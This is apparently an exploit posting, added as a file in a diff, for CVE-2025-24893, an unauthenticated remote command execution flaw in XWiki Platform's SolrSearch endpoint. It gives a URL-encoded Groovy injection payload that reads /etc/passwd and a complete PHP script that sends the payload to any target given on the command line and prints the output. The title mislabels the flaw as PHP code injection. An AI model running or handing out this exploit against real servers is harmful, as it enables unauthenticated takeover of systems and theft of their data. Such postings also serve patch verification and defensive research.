@@ -1,0 +1,118 @@
+=============================================================================================================================================
+| # Title     : XWiki Platform 15.10.10 php code injection                                                                                  |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.xwiki.org/                                                                                                      |
+=============================================================================================================================================
+
+[+] Summary : 
+
+XWiki Platform suffers from a **critical RCE vulnerability** allowing **unauthenticated remote command execution** through the vulnerable `SolrSearch` endpoint.
+An attacker can execute arbitrary system commands as the server’s running user,  
+leading to complete compromise of confidentiality, integrity, and availability.
+
+The issue is patched in versions **15.10.11**, **16.4.1**, and **16.5.0RC1**.
+
+-------------------------------------------------------------------------------
+
+## 2. Technical Details
+
+The vulnerability exists in the following endpoint: /bin/get/Main/SolrSearch?media=rss&text=
+
+By injecting malicious Groovy code inside the Solr search template,  
+a remote attacker can execute system commands such as:
+
+cat /etc/passwd
+whoami
+id
+
+Example injection payload (URL-encoded): }}}{{async async=false}}{{groovy}}println("cat /etc/passwd".execute().text){{/groovy}}{{/async}}
+
+The vulnerable endpoint processes the Groovy code **without authentication**.
+
+
+[+] References : ( CVE-2025-24893 ) 
+
+1. Save the file as: poc.php
+
+2.Execute: php poc.php http://127.0.0.1
+
+
+[+]  POC
+
+<?php
+/*
+ * XWiki Platform - php Code injection (CVE-2025-24893)
+ * by: Indoushka
+ */
+
+function banner() {
+    echo str_repeat("=", 80) . PHP_EOL;
+    echo " XWiki Platform - Remote Code Execution (CVE-2025-24893)" . PHP_EOL;
+    echo " Exploit Author: Al Baradi Joy" . PHP_EOL;
+    echo " PHP Version by: Indoushka" . PHP_EOL;
+    echo str_repeat("=", 80) . PHP_EOL;
+}
+
+function detectProtocol($domain) {
+    $https = "https://{$domain}";
+    $http  = "http://{$domain}";
+
+    echo "[*] Detecting protocol...\n";
+
+    $context = stream_context_create(["http" => ["timeout" => 5]]);
+
+    if (@file_get_contents($https, false, $context) !== false) {
+        echo "[✔] Target supports HTTPS: $https\n";
+        return $https;
+    }
+
+    echo "[!] HTTPS failed, trying HTTP...\n";
+
+    if (@file_get_contents($http, false, $context) !== false) {
+        echo "[✔] Target supports HTTP: $http\n";
+        return $http;
+    }
+
+    echo "[✖] Target unreachable via HTTP/HTTPS.\n";
+    exit;
+}
+
+function exploit($target) {
+    $clean = str_replace(["http://", "https://"], "", $target);
+    $base = detectProtocol($clean);
+
+    $payload = "%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7d".
+               "println(%22cat%20/etc/passwd%22.execute().text)".
+               "%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d";
+
+    $url = $base . "/bin/get/Main/SolrSearch?media=rss&text=" . $payload;
+
+    echo "[+] Sending exploit to: $url\n";
+
+    $response = @file_get_contents($url);
+
+    if ($response && strpos($response, "root:") !== false) {
+        echo "[✔] Exploit Successful! Output:\n\n";
+        echo $response . "\n";
+    } else {
+        echo "[✖] Exploit failed or no useful output.\n";
+        if ($response) echo $response;
+    }
+}
+
+banner();
+
+if ($argc < 2) {
+    echo "Usage: php {$argv[0]} <target_url>\n";
+    echo "Example: php {$argv[0]} xwiki.example.com\n";
+    exit;
+}
+
+$target = $argv[1];
+exploit($target);
+?>
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
